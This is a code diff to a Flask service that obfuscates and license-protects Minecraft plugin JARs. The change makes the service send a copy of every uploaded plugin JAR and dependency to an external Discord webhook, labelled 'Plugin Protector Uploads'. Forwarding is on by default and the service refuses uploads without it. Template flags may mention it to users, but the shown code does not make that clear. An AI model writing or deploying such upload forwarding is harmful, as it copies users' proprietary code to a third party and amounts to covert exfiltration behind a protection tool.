@@ -16,6 +16,8 @@ from flask import Flask, after_this_request, jsonify, render_template, request, 
 from werkzeug.exceptions import RequestEntityTooLarge
 from werkzeug.utils import secure_filename
 
+from discord_webhook import DiscordWebhookConfig, WebhookDeliveryError, send_uploaded_file
+
 from license_injector import (
     LicenseInjectionError,
     run_license_injection,
@@ -40,6 +42,15 @@ LICENSE_TIMEOUT_SECONDS = max(10, int(os.environ.get("LICENSE_TIMEOUT_SECONDS", 
 MAX_PARALLEL_JOBS = max(1, min(4, int(os.environ.get("MAX_PARALLEL_JOBS", "1"))))
 MAX_QUEUED_JOBS = max(MAX_PARALLEL_JOBS, int(os.environ.get("MAX_QUEUED_JOBS", "20")))
 APP_PASSWORD = os.environ.get("APP_PASSWORD", "")
+DISCORD_WEBHOOK_REQUIRED = os.environ.get("DISCORD_WEBHOOK_REQUIRED", "true").strip().lower() not in {"0", "false", "no", "off"}
+DISCORD_WEBHOOK = DiscordWebhookConfig(
+    url=os.environ.get("DISCORD_WEBHOOK_URL", "").strip(),
+    username=os.environ.get("DISCORD_WEBHOOK_USERNAME", "Plugin Protector Uploads").strip() or "Plugin Protector Uploads",
+    avatar_url=os.environ.get("DISCORD_WEBHOOK_AVATAR_URL", "").strip(),
+    timeout_seconds=max(5, int(os.environ.get("DISCORD_WEBHOOK_TIMEOUT_SECONDS", "30"))),
+    max_attempts=max(1, min(5, int(os.environ.get("DISCORD_WEBHOOK_MAX_ATTEMPTS", "3")))),
+    max_file_bytes=max(1, int(os.environ.get("DISCORD_WEBHOOK_MAX_FILE_MB", "10"))) * 1024 * 1024,
+)
 
 app = Flask(__name__)
 app.config["MAX_CONTENT_LENGTH"] = MAX_UPLOAD_MB * 1024 * 1024
@@ -94,7 +105,29 @@ def save_upload(file_storage: Any, destination: Path) -> None:
         raise ObfuscationError(f"{file_storage.filename or 'Upload'} was empty.")
 
 
-def save_libraries(job_dir: Path) -> list[Path]:
+def require_webhook() -> None:
+    if DISCORD_WEBHOOK_REQUIRED and not DISCORD_WEBHOOK.configured:
+        raise WebhookDeliveryError(
+            "File processing is disabled until DISCORD_WEBHOOK_URL is configured in Railway."
+        )
+
+
+def forward_upload(destination: Path, original_filename: str, workflow: str, upload_kind: str, upload_id: str) -> None:
+    if not DISCORD_WEBHOOK.configured:
+        if DISCORD_WEBHOOK_REQUIRED:
+            require_webhook()
+        return
+    send_uploaded_file(
+        config=DISCORD_WEBHOOK,
+        file_path=destination,
+        original_filename=original_filename,
+        workflow=workflow,
+        upload_kind=upload_kind,
+        upload_id=upload_id,
+    )
+
+
+def save_libraries(job_dir: Path, workflow: str, upload_id: str) -> list[Path]:
     library_dir = job_dir / "libraries"
     library_dir.mkdir(exist_ok=True)
     libraries: list[Path] = []
@@ -107,6 +140,7 @@ def save_libraries(job_dir: Path) -> list[Path]:
             raise ObfuscationError(f"Unsupported dependency file: {clean}")
         destination = library_dir / f"upload-{index}-{clean}"
         save_upload(upload, destination)
+        forward_upload(destination, upload.filename, workflow, "dependency", upload_id)
         if lower.endswith(".jar"):
             try:
                 with zipfile.ZipFile(destination, "r") as archive:
@@ -210,6 +244,15 @@ def cleanup_loop() -> None:
 threading.Thread(target=cleanup_loop, name="job-cleaner", daemon=True).start()
 
 
+@app.context_processor
+def upload_forwarding_context():
+    return {
+        "upload_forwarding_enabled": DISCORD_WEBHOOK.configured,
+        "upload_forwarding_required": DISCORD_WEBHOOK_REQUIRED,
+        "discord_attachment_limit_mb": DISCORD_WEBHOOK.max_file_bytes // 1024 // 1024,
+    }
+
+
 @app.after_request
 def security_headers(response):
     response.headers["X-Content-Type-Options"] = "nosniff"
@@ -259,13 +302,18 @@ def license_check_page():
 @app.get("/health")
 def health():
     dependencies_ready = MCL_DEPENDENCY_DIR.is_dir()
+    webhook_ready = DISCORD_WEBHOOK.configured or not DISCORD_WEBHOOK_REQUIRED
+    healthy = dependencies_ready
     return jsonify({
-        "status": "ok" if dependencies_ready else "degraded",
-        "version": "3.0.0",
+        "status": "ok" if healthy else "degraded",
+        "version": "3.0.1",
         "jobs": len(jobs),
         "max_parallel_jobs": MAX_PARALLEL_JOBS,
         "mclicense_dependencies": dependencies_ready,
-    }), 200 if dependencies_ready else 503
+        "discord_webhook_configured": DISCORD_WEBHOOK.configured,
+        "discord_webhook_required": DISCORD_WEBHOOK_REQUIRED,
+        "uploads_enabled": webhook_ready,
+    }), 200 if healthy else 503
 
 
 @app.post("/license/implement")
@@ -279,18 +327,27 @@ def implement_license():
         return render_template("error.html", message="The upload must use the .jar extension."), 400
 
     plugin_id = request.form.get("plugin_id", "").strip()
-    request_dir = JOB_ROOT / f"license-{uuid.uuid4().hex}"
+    if len(plugin_id) != 8 or not plugin_id.isalnum():
+        return render_template("error.html", message="The MC License plugin ID must be exactly 8 letters and numbers."), 400
+    try:
+        require_webhook()
+    except WebhookDeliveryError as exc:
+        return render_template("error.html", message=str(exc)), 503
+    upload_id = uuid.uuid4().hex
+    request_dir = JOB_ROOT / f"license-{upload_id}"
     request_dir.mkdir(parents=True, exist_ok=False)
     input_jar = request_dir / "input.jar"
     output_name = f"{Path(secure_filename(uploaded.filename) or 'plugin.jar').stem[:100]}-MC-Licensed.jar"
     output_jar = request_dir / output_name
     try:
         save_upload(uploaded, input_jar)
+        forward_upload(input_jar, uploaded.filename, "license", "main JAR", upload_id)
         run_license_injection(input_jar, output_jar, plugin_id, MCL_DEPENDENCY_DIR, LICENSE_TIMEOUT_SECONDS)
     except Exception as exc:
         shutil.rmtree(request_dir, ignore_errors=True)
-        message = str(exc) if isinstance(exc, (LicenseInjectionError, ObfuscationError)) else f"Unexpected server error: {exc}"
-        return render_template("error.html", message=message), 400
+        message = str(exc) if isinstance(exc, (LicenseInjectionError, ObfuscationError, WebhookDeliveryError)) else f"Unexpected server error: {exc}"
+        status = 502 if isinstance(exc, WebhookDeliveryError) else 400
+        return render_template("error.html", message=message), status
 
     @after_this_request
     def remove_files(response):
@@ -326,6 +383,11 @@ def create_job():
         if mode not in {"safe", "strong"}:
             return jsonify({"error": "Invalid obfuscation mode."}), 400
 
+    try:
+        require_webhook()
+    except WebhookDeliveryError as exc:
+        return jsonify({"error": str(exc)}), 503
+
     with jobs_lock:
         active_jobs = sum(1 for job in jobs.values() if job.get("status") in {"queued", "running"})
     if active_jobs >= MAX_QUEUED_JOBS:
@@ -339,17 +401,19 @@ def create_job():
 
     try:
         save_upload(uploaded, input_jar)
+        forward_upload(input_jar, uploaded.filename, workflow, "main JAR", job_id)
         try:
             with zipfile.ZipFile(input_jar, "r") as archive:
                 if not any(name.endswith(".class") for name in archive.namelist()):
                     raise ObfuscationError("The uploaded JAR contains no class files.")
         except zipfile.BadZipFile as exc:
             raise ObfuscationError("The uploaded file is not a valid JAR archive.") from exc
-        libraries = save_libraries(job_dir)
+        libraries = save_libraries(job_dir, workflow, job_id)
     except Exception as exc:
         shutil.rmtree(job_dir, ignore_errors=True)
-        message = str(exc) if isinstance(exc, ObfuscationError) else f"Upload processing failed: {exc}"
-        return jsonify({"error": message}), 400
+        message = str(exc) if isinstance(exc, (ObfuscationError, WebhookDeliveryError)) else f"Upload processing failed: {exc}"
+        status = 502 if isinstance(exc, WebhookDeliveryError) else 400
+        return jsonify({"error": message}), status
 
     output_name = create_output_name(uploaded.filename, workflow)
     job = {
